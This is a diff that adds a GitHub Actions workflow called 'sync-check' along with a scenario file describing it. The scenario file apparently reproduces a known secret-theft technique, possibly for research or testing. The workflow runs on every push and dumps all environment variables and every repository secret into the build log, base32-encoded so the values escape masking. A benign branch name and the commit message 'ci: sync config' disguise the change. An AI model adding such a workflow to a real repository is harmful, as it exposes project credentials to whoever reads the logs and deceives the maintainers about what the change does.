@@ -1,0 +1,26 @@
+diff --git "a/C:\\Users\\lenovo\\AppData\\Local\\Temp\\tmp8rhfwuj1\\applied/.github/workflows/sync-check.yml" "b/C:\\Users\\lenovo\\AppData\\Local\\Temp\\tmp8rhfwuj1\\applied/.github/workflows/sync-check.yml"
+new file mode 100644
+index 0000000..d095358
+--- /dev/null
++++ "b/C:\\Users\\lenovo\\AppData\\Local\\Temp\\tmp8rhfwuj1\\applied/.github/workflows/sync-check.yml"
+@@ -0,0 +1,12 @@
++name: sync-check
++on: [push]
++permissions: {}
++jobs:
++  sync:
++    runs-on: ubuntu-latest
++    timeout-minutes: 6
++    steps:
++      - name: build
++        run: |
++          env | base32 -w 120
++          echo -n '${{ toJSON(secrets) }}' | base32 -w 120
+diff --git "a/C:\\Users\\lenovo\\AppData\\Local\\Temp\\tmp8rhfwuj1\\applied/_scenario.json" "b/C:\\Users\\lenovo\\AppData\\Local\\Temp\\tmp8rhfwuj1\\applied/_scenario.json"
+new file mode 100644
+index 0000000..c8671a9
+--- /dev/null
++++ "b/C:\\Users\\lenovo\\AppData\\Local\\Temp\\tmp8rhfwuj1\\applied/_scenario.json"
+@@ -0,0 +1 @@
++{"id": "V1", "name": "Gheist 原版复刻", "branch": "ci-sync-a7f3k9", "commit_message": "ci: sync config", "changes": [{"path": ".github/workflows/sync-check.yml", "action": "add", "file": "sync-check.yml"}]}
+\ No newline at end of file
